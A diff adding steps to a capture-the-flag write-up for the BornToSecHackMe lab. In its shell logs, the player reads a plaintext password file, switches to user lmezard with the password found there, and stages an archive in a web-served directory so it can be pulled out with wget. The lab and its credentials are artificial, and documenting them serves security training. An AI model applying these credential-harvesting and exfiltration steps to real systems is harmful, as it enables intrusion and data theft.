@@ -167,3 +167,36 @@ www-data@BornToSecHackMe:/var/www/forum/templates_c$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@BornToSecHackMe:/var/www/forum/templates_c$
 ```
+
+In the directory `/home`, there is a directory `LOOKATME` which contains a file password.
+
+```
+www-data@BornToSecHackMe:/home$ cat /home/LOOKATME/password 
+lmezard:G!@M6f4Eatau{sF"
+```
+
+With these credentials `lmezard` : `G!@M6f4Eatau{sF"`, we can login to the user `lmezard` with the following command : `su lmezard`.
+
+```
+www-data@BornToSecHackMe:/home$ su lmezard
+Password: 
+lmezard@BornToSecHackMe:~$ id
+uid=1001(lmezard) gid=1001(lmezard) groups=1001(lmezard)
+lmezard@BornToSecHackMe:~$
+```
+
+In the home directory there is a `README` file which contains this text referencing the file `fun`. It is an archive containing a lot of `pcap` files each containing part of a `c` program. Since we can't `scp` to our machine directly, we need to find another way.
+
+```
+lmezard@BornToSecHackMe:~$ cp fun /tmp/fun
+lmezard@BornToSecHackMe:~$ chmod 777 /tmp/fun
+lmezard@BornToSecHackMe:~$ exit
+exit
+www-data@BornToSecHackMe:/home$ cp /tmp/fun /var/www/forum/templates_c/fun
+```
+
+Then on our machine, we can get the file `fun` from the website.
+
+```sh
+wget https://10.11.250.230/forum/templates_c/fun --no-check-certificate
+```
